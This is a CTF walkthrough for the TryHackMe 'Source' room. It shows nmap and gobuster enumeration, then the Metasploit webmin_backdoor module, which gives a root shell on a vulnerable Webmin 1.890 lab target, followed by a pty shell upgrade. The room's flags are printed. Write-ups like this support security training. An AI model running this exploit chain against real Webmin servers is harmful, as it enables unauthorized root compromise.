---

title: "TryHackMe - Source Write-up"
author: "FAFS FSAFAF"
date: "2025-09-09"
categories: \[TryHackMe, CTF, Writeup]
--------------------------------------

# TryHackMe - Source Write-up

## 📌 Overview

* **Room:** Source
* **Difficulty:** Easy
* **Tags:** Enumeration, Webmin, Exploitation, Privilege Escalation

This room focuses on exploiting a vulnerable Webmin service to gain root access.

---

## 📑 Table of Contents

1. [Enumeration](#-enumeration)
2. [Web Enumeration](#-web-enumeration)
3. [Exploitation](#-exploitation)
4. [Post-Exploitation](#-post-exploitation)
5. [Flags](#-flags)
6. [Conclusion](#-conclusion)

---

## 🔍 Enumeration

### Nmap Scan

We start by scanning the target with **nmap**:

```bash
sudo nmap -sC -sV -T4 {target_IP}
```

* **-sC**: Run default scripts
* **-sV**: Detect service versions
* **-T4**: Aggressive timing for faster results

**Results:**

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

✅ Open ports:

* **22/tcp** → SSH
* **10000/tcp** → Webmin

---

## 🌐 Web Enumeration

Visiting `https://{target_IP}:10000` revealed a **Webmin login page**.

* Default credentials were tested → **failed**
* Directory enumeration with **gobuster** produced no useful results:

```bash
gobuster dir -u https://{target_IP}:10000 -w /usr/share/wordlists/dirb/common.txt
```

---

## 🎯 Exploitation

### Searchsploit

We check for Webmin exploits:

```bash
searchsploit webmin
```

Several **RCE exploits** were available. Since the Webmin version is vulnerable, we proceed with **Metasploit**.

### Metasploit

Start `msfconsole` and search for Webmin exploits:

```bash
msf6 > search webmin
```

We use the **Webmin backdoor exploit**:

```bash
use exploit/linux/http/webmin_backdoor
set RHOST {target_IP}
set RPORT 10000
set LHOST tun0
set SSL true
exploit
```

✅ This immediately provided a **root shell**.

---

## 🖥️ Post-Exploitation

To upgrade the shell to a stable TTY:

```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/anyname.py
python /tmp/anyname.py
```

We now have a fully interactive **root shell**.

---

## 🚩 Flags

Retrieve flags from the machine:

```text
user.txt → THM{SUPPLY_CHAIN_COMPROMISE}
root.txt → THM{UPDATE_YOUR_INSTALL}
```

---

## ✅ Conclusion

* Enumerated open ports with `nmap`
* Identified Webmin service on port 10000
* Verified vulnerable Webmin version
* Exploited with **Metasploit `webmin_backdoor`**
* Achieved **root access** and captured flags

This room is ideal for practicing **service enumeration** and **Metasploit exploitation**.
